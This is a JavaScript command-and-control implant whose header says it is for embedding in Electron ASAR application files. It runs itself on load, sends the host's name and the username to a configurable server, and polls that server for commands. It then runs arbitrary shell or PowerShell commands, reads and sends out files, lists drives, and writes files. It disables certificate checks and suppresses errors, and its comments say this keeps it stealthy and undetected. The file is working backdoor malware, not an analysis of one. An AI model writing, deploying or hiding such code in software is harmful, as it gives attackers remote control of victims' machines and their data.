// C2 Client for embedding in ASAR files
const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Configuration (customize these values)
const CONFIG = {
    // Server connection details
    serverHost: '127.0.0.1',
    serverPort: 8443,
    connectInterval: 10000, // 10 seconds between check-ins
    
    // Optional encryption key (implement proper encryption in production)
    encryptionKey: 'change_this_key',
    
    // Unique identifier for this client (auto-generated on first run)
    clientId: null
};

class C2Client {
    constructor(config) {
        this.config = config;
        this.clientId = this.getOrCreateClientId();
        this.lastCommand = null;
    }

    // Generate or retrieve existing client ID
    getOrCreateClientId() {
        if (this.config.clientId) return this.config.clientId;
        
        // Generate a simple unique ID based on machine info
        const machineId = `${os.hostname()}-${os.userInfo().username}-${os.platform()}`;
        return Buffer.from(machineId).toString('base64');
    }

    // Start the C2 communication cycle
    start() {
        // Register with the C2 server
        this.registerWithC2();
        
        // Begin regular check-in interval
        setInterval(() => {
            this.checkIn();
        }, this.config.connectInterval);
    }

    // Register this client with the C2 server
    registerWithC2() {
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            release: os.release(),
            username: os.userInfo().username,
            clientId: this.clientId
        };

        this.sendRequest('/register', systemInfo);
    }

    // Regular check-in to get commands
    checkIn() {
        this.sendRequest('/checkin', { clientId: this.clientId }, (response) => {
            if (response && response.command) {
                this.handleCommand(response.command);
            }
        });
    }

    // Handle commands from the server
    handleCommand(commandObj) {
        if (!commandObj || !commandObj.type) return;

        switch (commandObj.type) {
            case 'exec':
                this.executeCommand(commandObj.data);
                break;
            case 'list':
                this.listDirectory(commandObj.data);
                break;
            case 'read':
                this.readFile(commandObj.data);
                break;
            case 'write':
                this.writeFile(commandObj.data.path, commandObj.data.content);
                break;
            default:
                console.log('Unknown command type:', commandObj.type);
        }
    }

    // Execute shell commands (cmd or powershell)
    executeCommand(cmd) {
        const usePS = cmd.startsWith('ps:');
        const actualCmd = usePS ? cmd.substring(3) : cmd;
        const shell = usePS ? 'powershell.exe' : (os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh');
        const shellArgs = usePS ? ['-Command', actualCmd] : (os.platform() === 'win32' ? ['/c', actualCmd] : ['-c', actualCmd]);

        exec(`${shell} ${shellArgs.join(' ')}`, (error, stdout, stderr) => {
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'exec',
                output: stdout || stderr,
                error: error ? error.message : null
            });
        });
    }

    // List directory contents
    listDirectory(dirPath) {
        try {
            // Handle listing drives on Windows
            if (dirPath === 'drives' && os.platform() === 'win32') {
                exec('wmic logicaldisk get caption', (error, stdout) => {
                    if (error) {
                        this.sendRequest('/result', {
                            clientId: this.clientId,
                            commandType: 'list',
                            path: 'drives',
                            items: [],
                            error: error.message
                        });
                        return;
                    }
                    
                    const drives = stdout.split('\r\r\n')
                        .filter(line => /[A-Za-z]:/.test(line))
                        .map(drive => {
                            const driveLetter = drive.trim();
                            return {
                                name: driveLetter,
                                type: 'drive',
                                path: driveLetter + '\\'
                            };
                        });
                    
                    console.log('Sending drive list to server:', drives);
                    
                    this.sendRequest('/result', {
                        clientId: this.clientId,
                        commandType: 'list',
                        path: 'drives',
                        items: drives,
                        error: null
                    });
                });
                return;
            }

            // Regular directory listing
            const stats = fs.statSync(dirPath);
            
            // If it's not a directory, return an error
            if (!stats.isDirectory()) {
                throw new Error(`"${dirPath}" is not a directory`);
            }
            
            const items = fs.readdirSync(dirPath, { withFileTypes: true }).map(item => {
                // Create full path
                const itemPath = path.join(dirPath, item.name);
                let size = 0;
                let modified = null;
                
                try {
                    // Get additional file/directory info
                    const stats = fs.statSync(itemPath);
                    size = stats.size;
                    modified = stats.mtime.toISOString();
                } catch (e) {
                    // Ignore errors when getting stats
                }
                
                return {
                    name: item.name,
                    type: item.isDirectory() ? 'directory' : 'file',
                    path: itemPath,
                    size: size,
                    modified: modified
                };
            });

            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'list',
                path: dirPath,
                items: items,
                error: null
            });
        } catch (error) {
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'list',
                path: dirPath,
                items: [],
                error: error.message
            });
        }
    }

    // Read file contents
    readFile(filePath) {
        try {
            const content = fs.readFileSync(filePath, 'utf8');
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'read',
                path: filePath,
                content: content,
                error: null
            });
        } catch (error) {
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'read',
                path: filePath,
                content: null,
                error: error.message
            });
        }
    }

    // Write to a file
    writeFile(filePath, content) {
        try {
            fs.writeFileSync(filePath, content, 'utf8');
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'write',
                path: filePath,
                success: true,
                error: null
            });
        } catch (error) {
            this.sendRequest('/result', {
                clientId: this.clientId,
                commandType: 'write',
                path: filePath,
                success: false,
                error: error.message
            });
        }
    }

    // Send HTTP request to the C2 server
    sendRequest(endpoint, data, callback) {
        const postData = JSON.stringify(data);
        
        const options = {
            hostname: this.config.serverHost,
            port: this.config.serverPort,
            path: endpoint,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            },
            // In a real implementation, consider proper certificate validation
            rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
            let responseData = '';
            
            res.on('data', (chunk) => {
                responseData += chunk;
            });
            
            res.on('end', () => {
                if (callback && responseData) {
                    try {
                        const jsonResponse = JSON.parse(responseData);
                        callback(jsonResponse);
                    } catch (e) {
                        console.error('Error parsing response:', e);
                        callback(null);
                    }
                }
            });
        });

        req.on('error', (error) => {
            console.error('Error connecting to C2:', error.message);
        });

        req.write(postData);
        req.end();
    }
}

// Self-starting function that's immediately invoked
(function() {
    try {
        // Create and start the C2 client
        const client = new C2Client(CONFIG);
        client.start();
        
        // Hide any console errors to maintain stealth
        console.error = () => {};
    } catch (e) {
        // Silently fail to avoid detection
    }
})();

// Export for potential module usage
module.exports = C2Client;
